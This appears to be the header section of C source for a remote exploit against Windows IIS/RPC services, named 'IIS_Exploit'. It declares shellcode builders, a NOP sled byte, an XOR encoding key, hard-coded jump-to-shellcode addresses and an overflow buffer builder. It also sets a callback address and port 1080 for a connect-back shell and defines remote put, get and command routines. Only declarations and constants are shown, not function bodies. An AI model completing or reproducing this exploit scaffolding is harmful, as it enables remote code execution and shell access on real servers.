/*
#include <windows.h> 
#include <winsock.h>
#include <stdio.h>
#include <httpext.h>
*/

/*
#define _WIN32_DCOM
#include <iostream.h>
#include <ocidl.h>
#include <rpc.h>
#include <rpcdce.h>
*/

#define  LANGUAGE    936  //950

#define  FNENDLONG   0x08
#define  NOPCODE	 'B'    // INC EDX    0x90
#define  NOPLONG     0x50
#define  BUFFSIZE    0x10000
#define  PATHLONG    0x12

#define  RETEIPADDRESS 0x100

#define  SHELLBUFFSIZE 0x800 
#define  DATABASE      0x41
#define  DATAXORCODE   0x55
#define  LOCKBIGNUM    19999999
#define  LOCKBIGNUM2   13579139
#define  WEBPORT       80  
#define  SRLF          "\r\n"    
 



void     findshellcodefnlock();
void     shellcodefnlock();
void     findshellcodefn();
void     shellcodefn(char *ecb);


void     cleanchkesp(char *fnadd,char *shellbuff,char *chkespadd ,int len);

void     iisput(char *str);
void     iisget(char *str);
void     iiscmd(char *str);
void     shellcmd();
int      newrecv(char *buff,int size);
//int      newsend(char *buff,int size);
char     *getfnaddress(char *fn);
int      codeshell(char *codebuff,int bufflen,char *shell,int shelllen);
int      codefindshell(char *codebuff,int bufflen,char *shell,int shelllen);
int      getapistr(char *buff);
int      GetShellcode(char *buffer);
int      GetFindShellcode(char *buffer);

void     sendoverpack();
void     sendoverstr();
int      RpcSendRecv(char *sendbuff,unsigned int sendlen,char *recvbuff,unsigned int *recvlen);
int      newsendrecv(char *sendbuff,int sendlen,char *recvbuff,int recvlen);

void     getvar(int argc, char **argv);
void     printinfo();

int      getoverbuff(char *overbuff);


  int xordatabegin;
  int  lockintvar1,lockintvar2;
  char lockcharvar;








//*********************************************************************************

    #define  TIMEOUT                 2000
    #define  CALLBACK_PORT           1080
   
    unsigned char *server             = NULL;
    unsigned char *s_port             = "80";
    unsigned char *callback_address   = NULL;
    unsigned char *callback_port      = "1080";
    unsigned char *urlfile            =NULL;
    unsigned char *proxy              =NULL;
    unsigned char *offsetstr          =NULL;
    unsigned char *doscmd             =NULL;
    unsigned char *file               =NULL;
    unsigned char *version            =NULL;

    unsigned char *password           ="\"\"";
    unsigned char *username           ="guest";
    unsigned char *protocol           = "tcp"; //"np";
    unsigned char *endpoint           = "1034"; //"\\pipe\\dnsserver"; 
    unsigned char  *object_uuid       = ""; //00000007-0c04-0000-FFFF-FFFF0a000000";

    unsigned char *network_address   = NULL;
    unsigned char *network_options   = NULL;
   	unsigned char *string_binding    = NULL;


#define    IISDATA    0
#define    IISCMD     1
#define    IISGET     2
#define    IISPUT     3

#define    FILEOPEN   0
#define    FILEDATA   1
#define    FILECLOSE  2
#define    FILEFIND   3

#define   RPCHOOKNUM   0
#define   DATASTR    "rpcd"
#define   NOPCODE  0x41
#define   ESCCODE  0x5f
#define   NEXTSHELLOFFSET  0x50

	
#define   JMPTOSHELLADDRESS 0x7ffdf290
#define   EXCEPTJMPADDRESS  0x7ffdf270


//#define   JMPTOSHELLADDRESS 0x7ffdf290
#define   OKNUM    0x12332100

#define   RVAWINXP 0x74ec0000
#define   RVAWIN2k 0x74ec0000




	int           cmdstat                = 0;

	int      sys_ver_num;
    int      overok=0;
    RPC_STATUS     status;


	unsigned char *exp_name            ="IIS_Exploit";
   // unsigned char *doscmd             =NULL;


    
//	int           server_socket       = 0;
	int           callback_socket     = 0;
    int           offset              = 0;
        
   




   
